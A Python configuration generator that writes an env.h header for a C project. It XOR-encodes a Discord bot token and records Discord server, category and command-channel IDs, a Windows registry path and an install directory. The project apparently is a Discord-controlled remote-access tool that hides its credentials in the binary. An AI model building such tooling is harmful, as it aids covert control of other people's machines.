ENVH_TEMPLATE = """
#ifndef ENV_H
#define ENV_H

/* DO NOT PUBLISH THIS FILE ANYWHERE */

#define KEY {KEY}

/* {TOKEN} */
#define BOT_TOKEN {OPEN_BRACE} \\
    {TOKEN_DATA} \\
{CLOSE_BRACE} /* very safe */

#define SERVER_ID "{SERVER_ID}"
#define CATEGORY_ID "{CATEGORY_ID}"
#define COMMANDS_ID "{COMMANDS_ID}"

#define FEMBOY_KISSER_REG_PATH "Software\\\\{NAME}"
#define INSTALL_PATH "{INSTALL_PATH}"

#define CONFIRM_CODE ((uint64_t){CONFIRM_CODE})

#endif /* ENV_H */
"""

print("This script will generate the env.h needed for compilation. Please enter the key in hexadecimal format (e.g., 0x4242).")
key = int(input("Enter the key: ").strip(), 16)

if key < 1:
    print("Key cannot be 0 or less. Please enter a valid key.")
    exit(1)

text = input("Enter the bot token: ").strip().encode()

if not text:
    print("Token cannot be empty. Please enter a valid token.")
    exit(1)

print("Go to your Discord server, right-click the channel you want to use for commands, and click 'Copy ID'. Do the same for the category you want to use for the bot, and the server itself. Paste them below.")
server_id = input("Enter the server ID: ").strip()
category_id = input("Enter the category ID: ").strip()
commands_id = input("Enter the commands ID: ").strip()

if not (server_id.isdigit() and category_id.isdigit() and commands_id.isdigit()):
    print("IDs must be numeric. Please enter valid IDs.")
    exit(1)

name = input("Enter the name for the software: ").strip()
if " " in name:
    print("Name cannot contain spaces. Please enter a valid name.")
    exit(1)
install_path = input(f"Enter the install path directory (eg: {name}_Dependencies): ").strip()
if " " in install_path:
    print("Install path cannot contain spaces. Please enter a valid install path.")
    exit(1)

confirm_code_input = input("Enter the confirm code in hexadecimal format (e.g., 0xCAFEBABE): ").strip()
if not confirm_code_input.startswith("0x") or not all(c in "0123456789abcdefABCDEF" for c in confirm_code_input[2:]):
    print("Confirm code must be in hexadecimal format. Please enter a valid confirm code.")
    exit(1)
confirm_code = int(confirm_code_input, 16)
print("Please remember the confirm code you entered.")

enc = [x ^ key for x in text]

# print(", ".join(f"0x{x:02X}" for x in enc))
# print(len(enc))

t = ", ".join(f"0x{x:02X}" for x in enc)

input("Press Enter to generate env.h...")

with open("source/env.h", "w") as f:
    f.write(ENVH_TEMPLATE.format(
        KEY=f"0x{key:02X}",
        TOKEN=text.decode(),
        TOKEN_DATA=t,
        OPEN_BRACE="{",
        CLOSE_BRACE="}",
        SERVER_ID=server_id,
        CATEGORY_ID=category_id,
        COMMANDS_ID=commands_id,
        NAME=name,
        INSTALL_PATH=install_path,
        CONFIRM_CODE=confirm_code
    ))

print("env.h has been generated successfully.")
print("Now you can run 'make main' to compile the project.")
